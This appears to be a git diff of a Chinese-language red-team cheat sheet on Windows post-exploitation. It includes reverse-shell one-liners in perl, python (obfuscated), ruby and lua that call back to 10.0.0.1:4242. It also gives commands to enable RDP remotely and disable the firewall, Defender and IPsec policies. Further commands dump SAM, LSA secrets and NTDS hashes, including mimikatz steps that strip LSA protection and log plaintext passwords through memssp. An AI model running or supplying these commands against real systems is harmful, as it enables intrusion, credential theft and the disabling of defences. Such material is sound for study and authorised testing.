@@ -14,6 +14,7 @@
 
 * **[LOL](#LOL)**
     * [PowerShell](#powershell)
+    * [白名单](#白名单)
     * [Other](#other)
 
 * **[RDP](#rdp)**
@@ -21,18 +22,30 @@
     * [多开](#多开)
     * [连接记录](#连接记录)
     * [凭据窃取](#凭据窃取)
+    * [绕过组策略限制](#绕过组策略限制)
+    * [绕过本地安全策略限制限制](#绕过本地安全策略限制限制)
 
 * **[认证](#认证)**
     * [本地](#本地)
+        * [mimikatz](#mimikatz)
+        * [加密降级攻击](#加密降级攻击)
+        * SAM & LSA Secrets
+        * Bypass LSA Protection
+        * Bypass Credential Guard
+        * [DPAPI](#dpapi)
     * [工作组](#工作组)
         * [IPC$](#ipc)
         * [PTH](#pth)
+            * [kb2871997](#kb2871997)
+            * PTH with RDP
         * [PTK](#ptk)
+        * [NTLM中继](#NTLM中继)
     * [域](#域)
         * [NTDS.DIT](#ntdsdit)
-            * [利用Dcsync获取域用户Hash](#利用dcsync获取域用户hash)
-            * [使用VSS卷影副本提取ntds.dit](#使用vss卷影副本提取ntdsdit)
             * [NTDS转储](#ntds转储)
+            * [Dcsync](#dcsync)
+            * [卷影复制](#卷影复制)
+        * [mscash](#mscash)
         * [GPP](#gpp)
         * [PTT](#ptt)
             * [Silver_Tickets](#silver_tickets)
@@ -41,7 +54,6 @@
         * [Kerberoasting](#kerberoasting)
         * [委派](#委派)
             * [查找域中委派主机或账户](#查找域中委派主机或账户)
-    * [毒化LLMNR和NBT-NS请求](#毒化llmnr和nbt-ns请求)
 
 ---
 
@@ -131,27 +143,10 @@ powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://192.16
 
 ---
 
-## Other
+## 白名单
 
-**perl**
-```perl
-perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
-```
-
-**python**
-```powershell
-C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.0.0.1', 4242)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
-```
-
-**ruby**
-```ruby
-ruby -rsocket -e 'c=TCPSocket.new("10.0.0.1","4242");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
-```
-
-**lua**
-```powershell
-lua5.1 -e 'local host, port = "10.0.0.1", 4242 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
-```
+**MSBuild**
+- [Use MSBuild To Do More](https://3gstudent.github.io/3gstudent.github.io/Use-MSBuild-To-Do-More/)
 
 **Mshta.exe**
 
@@ -327,6 +322,30 @@ sc \\host delete foobar                                         # 完事后删�
 
 ---
 
+## Other
+
+**perl**
+```perl
+perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+```
+
+**python**
+```powershell
+C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.0.0.1', 4242)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
+```
+
+**ruby**
+```ruby
+ruby -rsocket -e 'c=TCPSocket.new("10.0.0.1","4242");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+```
+
+**lua**
+```powershell
+lua5.1 -e 'local host, port = "10.0.0.1", 4242 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
+```
+
+---
+
 # RDP
 
 **第三方连接工具**
@@ -337,90 +356,122 @@ sc \\host delete foobar                                         # 完事后删�
 
 ## 命令行开启RDP
 
+**相关文章**
+- [开启 RDP](https://b404.xyz/2017/12/27/open-RDP/)
+- [查询和开启3389端口方式总结](https://mp.weixin.qq.com/s/hgGcoEghsW0IIh7r-YCKCg)
+
 **查看 3389 端口是否开启**
 ```bash
 REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /*如果是0x0则开启
 ```
+
+![](../../../../assets/img/Security/RedTeam/OS安全/Windows安全/7.png)
 
 **查看远程连接的端口**
 ```bash
 REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber
 ```
 
+![](../../../../assets/img/Security/RedTeam/OS安全/Windows安全/8.png)
+
+tasklist、netstat 命令查询 3389 端口
+```
+tasklist /svc | findstr "TermService"
+netstat -ano | findstr "xxx"
+```
+
 **cmd 开 RDP**
-- 文章
-    - [开启 RDP](https://b404.xyz/2017/12/27/open-RDP/)
+- REG 开启
+    1. 方法一 : `REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f`
 
-- 命令
-    - dos 命令开启 3389 端口(开启 XP&2003 终端服务)
-        1. 方法一 : `REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f`
+    2. 方法二 : `REG add HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /d 0 /t REG_DWORD /f`
 
-        2. 方法二 : `REG add HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /d 0 /t REG_DWORD /f`
+- WMIC 开启 3389
+    ```
+    wmic /namespace:\\root\CIMV2\TerminalServices PATH Win32_TerminalServiceSetting WHERE (__CLASS !="") CALL SetAllowTSConnections 1
+    wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1
+    ```
 
-    - WMIC 开启 3389
+- WMIC 开启远程主机 3389 端口
+    Win2k/XP/Win2k3
+    ```
+    wmic /node:192.168.1.1 /user:administrator /password:123123 PATH win32_terminalservicesetting WHERE (__Class!="") CALL SetAllowTSConnections 1
+    ```
 
-        ```
-        wmic /namespace:\\root\CIMV2\TerminalServices PATH Win32_TerminalServiceSetting WHERE (__CLASS !="") CALL SetAllowTSConnections 1
-        ```
+    Win7/Win2k8/Win8.1/Win10/2012/2016
+    ```
+    wmic /node:192.168.1.1 /user:administrator /password:123123 RDTOGGLE WHERE ServerName='WIN-TO2CN3V2VPR' call SetAllowTSConnections 1
+    wmic /node:192.168.1.1 /user:administrator /password:123123 process call create 'cmd.exe /c REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'
+    ```
 
-    - PowerShell 开启 RDP
-        1. Enable RDP : `set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0`
+- PowerShell 开启 RDP
+    1. Enable RDP : `set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0`
 
-        2. Allow RDP in firewall : `Set-NetFirewallRule -Name RemoteDesktop-UserMode-In-TCP -Enabled true`
+    2. Allow RDP in firewall : `Set-NetFirewallRule -Name RemoteDesktop-UserMode-In-TCP -Enabled true`
 
-        3. Enable secure RDP authentication : `set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1`
+    3. Enable secure RDP authentication : `set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1`
 
-        或
+    或
 
-        1. Enable Remote Desktop : `(Get-WmiObject Win32_TerminalServiceSetting -Namespace root\cimv2\TerminalServices).SetAllowTsConnections(1,1) `
+    1. Enable Remote Desktop : `(Get-WmiObject Win32_TerminalServiceSetting -Namespace root\cimv2\TerminalServices).SetAllowTsConnections(1,1) `
         `(Get-WmiObject -Class "Win32_TSGeneralSetting" -Namespace root\cimv2\TerminalServices -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0) `
 
-        2. Enable the firewall rule : `Enable-NetFirewallRule -DisplayGroup "Remote Desktop"`
+    2. Enable the firewall rule : `Enable-NetFirewallRule -DisplayGroup "Remote Desktop"`
 
-    - reg 开启
-        ```
-        Windows Registry Editor Version 5.00
-        [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]
-        "fDenyTSConnections"=dword:00000000
-        [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]
-        "PortNumber"=dword:00000d3d
-        ```
-        ```
-        regedit /s a.reg
-        ```
+- MSSQL xp_regwrite开启3389端口
 
-    - 更改终端端口为 2008(十六进制为:0x7d8)
+    1. 查询3389开启状态 : `exec master.dbo.xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server' ,'fDenyTSConnections'`
 
-        1. `REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\Wds\rdpwd\Tds\tcp /v PortNumber /t REG_DWORD /d 0x7d8 /f`
-        2. `REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber /t REG_DWORD /d 0x7D8 /f`
+    2. 查询3389远程桌面端口 : `exec master.dbo.xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp','PortNumber' `
 
-    - 查看 RDP 服务端口是否更改
+    3. 开启3389远程桌面端口（0：ON、1：OFF）: `exec master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server','fDenyTSConnections','REG_DWORD',0;`
 
-        ```
-        REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber  /*出来的结果是 16 进制
-        ```
+- reg 开启
+    ```
+    Windows Registry Editor Version 5.00
+    [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]
+    "fDenyTSConnections"=dword:00000000
+    [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]
+    "PortNumber"=dword:00000d3d
+    ```
+    ```
+    regedit /s a.reg
+    ```
 
-    - 允许 3389 端口
-        ```
-        netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow
-        ```
+- msf
+    ```
+    run getgui -e
+    ```
 
-    - 关闭防火墙
-        ```
-        netsh advfirewall set allprofiles state off
+- 更改终端端口为 2008(十六进制为:0x7d8)
 
-        ```
+    1. `REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\Wds\rdpwd\Tds\tcp /v PortNumber /t REG_DWORD /d 0x7d8 /f`
+    2. `REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber /t REG_DWORD /d 0x7D8 /f`
 
-    - 关闭Denfnder
-        ```
-        net stop windefend
-        ```
+- 查看 RDP 服务端口是否更改
+    ```
+    REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber  /*出来的结果是 16 进制
+    ```
 
-    - 取消 xp&2003 系统防火墙对终端服务的限制及 IP 连接的限制:
+- 允许 3389 端口
+    ```
+    netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow
+    ```
 
-        ```
-        REG ADD HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List /v 3389:TCP /t REG_SZ /d 3389:TCP:*:Enabled :@ xpsp2res.dll,-22009 /f
-        ```
+- 关闭防火墙
+    ```
+    netsh advfirewall set allprofiles state off
+    ```
+
+- 关闭Denfnder
+    ```
+    net stop windefend
+    ```
+
+- 取消 xp&2003 系统防火墙对终端服务的限制及 IP 连接的限制:
+    ```
+    REG ADD HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List /v 3389:TCP /t REG_SZ /d 3389:TCP:*:Enabled :@ xpsp2res.dll,-22009 /f
+    ```
 
 ---
 
@@ -464,9 +515,77 @@ REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\W
 
 ## 凭据窃取
 
+**相关文章**
+- [获取远程主机保存的 RDP 凭据密码](https://0x20h.com/p/bf1f.html)
+- [解密目标系统RDP连接密码](https://www.jianshu.com/p/6c11412947e5)
+
 **相关工具**
 - [hmoytx/RdpThief_tools](https://github.com/hmoytx/RdpThief_tools) - 窃取 mstsc 中的用户明文凭据
 - [0x09AL/RdpThief](https://github.com/0x09AL/RdpThief)
+- [mimikatz](../../安全工具/Mimikatz.md#dpapi)
+
+---
+
+## 绕过组策略限制
+
+**相关文章**
+- [组策略限制3389登录的绕过方式](https://mp.weixin.qq.com/s/4eDNmiiXp7afLKdYzHeb3Q)
+
+**修改本地组策略**
+```
+secedit /export /cfg c:\gp.inf /quiet                     //导出组策略
+```
+
+编辑 c:\gp.inf,删除指定策略,在导入
+```
+secedit /configure /db c:\gp.sdb /cfg c:\gp.inf /quiet      //导入组策略
+gpupdate /force                                             //更新组策略
+```
+
+策略举例
+- 拒绝本地登陆：
+
+    说明：此安全设置确定要防止哪些用户在该计算机上登录。如果帐户受制于此策略设置和“允许本地登录”策略设置，则前者会取代后者。
+    ```
+    SeDenyInteractiveLogonRight = Guest
+    ```
+- 拒绝通过远程桌面服务登录：
+
+    说明：此安全设置确定禁止哪些用户和组作为远程桌面服务客户端登录。
+    ```
+    SeDenyRemoteInteractiveLogonRight = Administrator
+    ```
+- 允许本地登陆：
+
+    说明：确定哪些用户可以登录到该计算机。
+    ```
+    SeInteractiveLogonRight = *S-1-5-32-544,*S-1-5-32-545,*S-1-5-32-551
+    *S-1-5-32-544：Administrators
+    *S-1-5-32-545：Users
+    *S-1-5-32-551：Backup Operators
+    ```
+- 允许通过远程桌面服务登录：
+
+    说明：此安全设置确定哪些用户或组具有作为远程桌面服务客户端登录的权限。
+    ```
+    SeRemoteInteractiveLogonRight = *S-1-5-32-544,*S-1-5-32-555
+    *S-1-5-32-544：Administrators
+    *S-1-5-32-555：Remote Desktop Users
+    ```
+
+---
+
+## 绕过本地安全策略限制限制
+
+**相关文章**
+- [IP安全策略限制3389登录的绕过方式](https://mp.weixin.qq.com/s/FMGqJx0GbhxXfdnFS929zQ)
+
+**解决方案**
+- 本地端口转发
+- 删除所有安全策略
+    ```
+    netsh ipsec static del all
+    ```
 
 ---
 
@@ -483,14 +602,15 @@ REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\W
 - [Windows用户密码的加密方法与破解](https://www.sqlsec.com/2019/11/winhash.html#toc-heading-2)
 - [Windows下的密码hash——NTLM hash和Net-NTLM hash介绍](https://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D/)
 - [浅学Windows认证](https://b404.xyz/2019/07/23/Study-Windows-Authentication/)
+- [抓取HASH的10001种方法](https://mp.weixin.qq.com/s/6mwms9LtLE6cK0ukpoSMmg)
+- [凭据收集总结](https://my.oschina.net/csxa/blog/4343803)
+- [Bypass LSA Protection&Credential Guard获取密码](https://xz.aliyun.com/t/6943)
+- [Windows下的密码hash——Net-NTLMv1介绍](https://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-Net-NTLMv1%E4%BB%8B%E7%BB%8D/)
 
 **相关工具**
 - Hashcat
     - [Hashcat 爆破NTLM-hash](../../安全工具/Hashcat.md#爆破NTLM-hash)
     - [Hashcat 爆破net-NTLMv2](../../安全工具/Hashcat.md#爆破net-NTLMv2)
-- [mimikatz](https://github.com/gentilkiwi/mimikatz) - 抓密码神器
-    - [mimikatz](../../安全工具/Mimikatz.md)
-- [skelsec/pypykatz](https://github.com/skelsec/pypykatz) - 用纯 Python 实现的 Mimikatz
 - [AlessandroZ/LaZagne](https://github.com/AlessandroZ/LaZagne) - 凭证抓取神器
 - [Arvanaghi/SessionGopher](https://github.com/Arvanaghi/SessionGopher) - 使用 WMI 提取 WinSCP、PuTTY、SuperPuTTY、FileZilla 和 Microsoft remote Desktop 等远程访问工具保存的会话信息的 ps 脚本
 - [Invoke-WCMDump](https://github.com/peewpw/Invoke-WCMDump) - 从 Credential Manager 中转储 Windows 凭证的 PowerShell 脚本
@@ -502,21 +622,150 @@ REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\W
 - [SterJo Key Finder](https://www.sterjosoft.com/key-finder.html) - 找出系统中软件的序列号
 - [uknowsec/SharpDecryptPwd](https://github.com/uknowsec/SharpDecryptPwd) - 对密码已保存在 Windwos 系统上的部分程序进行解析,包括：Navicat,TeamViewer,FileZilla,WinSCP,Xmangager 系列产品(Xshell,Xftp)。
 - Impacket
+
+### mimikatz
+
+- [mimikatz](../../安全工具/Mimikatz.md)
+
+---
+
+### 加密降级攻击
+
+`NetNTLM Downgrade Attacks`
+
+**相关文章**
+- [Post Exploitation Using NetNTLM Downgrade Attacks](https://www.optiv.com/explore-optiv-insights/blog/post-exploitation-using-netntlm-downgrade-attacks)
+
+**相关工具**
+- [eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue) - NetNTLM Downgrade Attacks,通过 SSPI 调⽤ NTLM 身份验证，通过协商使⽤预定义 challenge 降级为 NetNTLMv1，获取到 NetNTLMv1 hash。⽽ NetNTLMv1 hash 可以短时间内使⽤彩虹表去破解。这种情况可以在不接触 LSASS 的情况下检索 NTLM 哈希。可以说比运行 Mimikatz 更隐秘，因为不需要向受保护的进程注入代码或从受保护的进程中转储内存。由于 NetNTLMv1 响应是通过在本地与 NTLMSSP 进行交互而引发的，因此不会生成网络流量，并且所选择的挑战也不容易看到。没有成功的 NTLM 身份验证事件记录在日志中。
     ```
-    # 通过 wmiexec pth 后
-    reg save HKLM\SYSTEM system.save
-    reg save HKLM\SAM sam.save
-    reg save HKLM\SECURITY security.save
-    get system.save
-    get sam.save
-    get security.save
-    del /f system.save
-    del /f sam.save
-    del /f security.save
+    InternalMonologue -Downgrade False -Restore False -Impersonate True -Verbose False -Challenge 1122334455667788
     ```
+
+    ![](../../../../assets/img/Security/RedTeam/OS安全/Windows安全/3.png)
+
+    如果以普通用户权限执行 InternalMonologue，能够获得当前用户权限的 Net-NTLMv2 数据包，通过 hashcat 进行破解，能获得当前用户的明文口令
+
+---
+
+### SAM & LSA Secrets
+
+在 Windows 系统中本机的用户密码以 hash 形式存储在 `%SystemRoot%\system32\config\sam` 数据库文件中。
+
+LSA Secrets 存储 PC 用户的文本密码、服务账户密码（例如，必须由某个用户运行才能执行某些任务的密码）、Internet Explorer 密码、RAS 连接密码、SQL 和 CISCO 密码、SYSTEM 账户密码、EFS 加密密钥等用户私人数据等等。
+
+LSA Secrets 存储在注册表中：
+```
+HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets
+```
+
+**mimikatz**
+```
+token::elevate
+lsadump::secrets
+```
+
+**注册表 dump**
+```
+reg save HKLM\SYSTEM system
+reg save HKLM\SAM sam
+reg save HKLM\SECURITY security
+
+impacket-secretsdump -sam sam -security security -system system LOCAL
+或
+lsadump::secrets /system:system /security:security
+```
+
+![](../../../../assets/img/Security/RedTeam/OS安全/Windows安全/4.png)
+
+**卷影复制**
+
+```bash
+wmic shadowcopy call create volume='c：\'       # 先创建 c 盘的 shadowscopy
+# 或者
+vssadmin create shadow /for=C:
+
+vssadmin list shadows   # 查看
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\system32\config\sam c:\sam
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\system32\config\security c:\security
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\system32\config\system c:\system
+
+# 用 impacket-secretsdump 来进行解密
+impacket-secretsdump -sam sam -security security -system system LOCAL
+```
+
+![](../../../../assets/img/Security/RedTeam/OS安全/Windows安全/5.png)
+
+---
+
+### Bypass LSA Protection
+
+1. 从磁盘上的 SAM 读取凭据
+2. mimikatz 其中的 mimidrv.sys 驱动程序，可从 lsass.exe 进程中删除 LSA 保护，成功 pypass LSA Protection。
     ```
-    ./secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
+    privilege::debug
+    !+
+    !processprotect /process:lsass.exe /remove
+    sekurlsa::logonpasswords
     ```
+
+    ![](../../../../assets/img/Security/RedTeam/OS安全/Windows安全/6.png)
+
+---
+
+### Bypass Credential Guard
+
+1. 从磁盘上的 SAM 读取凭据
+2. SSP 是参与用户身份验证的 Microsoft 软件包，如在用户登录时被调用，并接收该用户的凭据。在系统启动时 SSP 会被加载到进程 lsass.exe 中。,Mimikatz 可通过内存安装自定义的 ssp，修改 lsass 进程的内存，实现从 lsass 进程中提取凭据，mimikatz 执行 misc::memssp 后，如果再输入了新的凭据 (如用户锁屏后重新登录)，将会在 c:\windows\system32 下生成文件 mimilsa.log，其中保存有用户明文密码。
+    ```
+    privilege::debug
+    misc::memssp
+    ```
+
+---
+
+### DPAPI
+
+由于功能需求，Dpapi 采用的加密类型为对称加密，所以只要找到了密钥，就能解开物理存储的加密信息了。
+
+**相关文章**
+- [通过Dpapi获取Windows身份凭证](https://www.lz1y.cn/2019/10/08/%E9%80%9A%E8%BF%87Dpapi%E8%8E%B7%E5%8F%96Windows%E8%BA%AB%E4%BB%BD%E5%87%AD%E8%AF%81/)
+- [渗透技巧——获取Windows系统下DPAPI中的MasterKey](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E8%8E%B7%E5%8F%96Windows%E7%B3%BB%E7%BB%9F%E4%B8%8BDPAPI%E4%B8%AD%E7%9A%84MasterKey/)
+
+**相关工具**
+- [mimikatz](../../安全工具/Mimikatz.md#dpapi)
+
+**延长 MasterKey 的有效期**
+```c
+#include <windows.h>
+int main(void)
+{
+	SYSTEMTIME st={0};
+	FILETIME   ft={0};
+	printf("[+]Start to change expiry time...\n");
+	st.wYear = 2025;
+	st.wMonth = 12;
+	st.wDay = 30;
+	st.wHour = 12;
+	st.wMinute = 30;
+	st.wSecond = 30;
+	printf("[+]New expiry time:%d-%d-%d %d:%d:%d\n", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
+	SystemTimeToFileTime(&st,&ft);
+	printf("dwLowDateTime:%08x\n",ft.dwLowDateTime);
+	printf("dwHighDateTime:%08x\n",ft.dwHighDateTime);
+
+	FILE *fp;
+    fopen_s(&fp,"Preferred","rb+");
+	fseek(fp,16,SEEK_SET);
+    fwrite(&ft.dwLowDateTime,sizeof(int),1,fp);
+	fwrite(&ft.dwHighDateTime,sizeof(int),1,fp);
+	fclose(fp);
+	printf("[+]Change success.\n");
+	return 0;
+}
+```
+
+![](../../../../assets/img/Security/RedTeam/OS安全/Windows安全/9.png)
 
 ---
 
@@ -541,7 +790,7 @@ REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\W
 net use \\192.168.1.1\c$ “12345@12345qw” /user:ffffffff0x\administrator
 net use \\192.168.1.1\c$ "123456" /user:administrator         # 建立的非空连接
 net use \\192.168.1.1\c$  "" /user:administrator              # 空连接，无密码
-net use \\192.168.1.1\c$ /del   # 删除建立的IPC连接
+net use \\192.168.1.1\c$ /del   # 删除建立的 IPC 连接
 net use                         # 查看本机连接共享情况
 
 psexec.exe \\192.168.1.1 cmd    # 通过 psexec 工具进行会话连接执行
@@ -747,6 +996,10 @@ Pass The Hash 能够完成一个不需要输入密码的 NTLM 协议认证流程
 
     mimikatz 的 PTK 相关操作见 [mimikatz 笔记](../../安全工具/Mimikatz.md#ptk)
 
+### NTLM中继
+
+- [NTLM中继](./实验/NTLM中继.md)
+
 ---
 
 ## 域
@@ -771,22 +1024,86 @@ ntds.dit 文件由三个主表组成：数据表，链接表和SD表。
 - [导出域密码哈希值的多种方法介绍](https://www.freebuf.com/articles/system/177764.html)
 - [How Attackers Dump Active Directory Database Credentials](https://adsecurity.org/?p=2398)
 
-#### 利用Dcsync获取域用户Hash
+#### NTDS转储
+
+**Impacket**
+
+- 工具地址 : [impacket](https://github.com/SecureAuthCorp/impacket)
+
+Impacket 是一组 python 脚本，可用于执行各种任务，包括提取 NTDS 文件的内容。impacket-secretsdump 模块需要我们提供 SYSTEM 和 NTDS 数据库文件。
+
+```bash
+./secretsdump.py -system /root/SYSTEM -ntds /root/ntds.dit LOCAL
+
+# system：表示系统 hive 文件的路径（SYSTEM）
+# ntds：表示 dit 文件的路径（ntds.dit）
+```
+
+此外，impacket 可以通过使用计算机帐户及其哈希进行身份验证从 NTDS.DIT 文件远程转储域密码哈希。
+```bash
+./secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:0f49aab58dd8fb314e268c4c6a65dfc9 -just-dc PENTESTLAB/dc\$@10.0.0.1
+```
+
+**DSInternals PowerShell**
+
+- 工具地址 : [MichaelGrafnetter/DSInternals](https://github.com/MichaelGrafnetter/DSInternals)
+
+DSInternals PowerShell 模块提供了构建在框架之上的易于使用的 cmdlet。主要功能包括离线 ntds.dit 文件操作以及通过目录复制服务（DRS）远程协议查询域控制器。
+```powershell
+Save-Module DSInternals -Path C:\Windows\System32\WindowsPowershell\v1.0\Modules
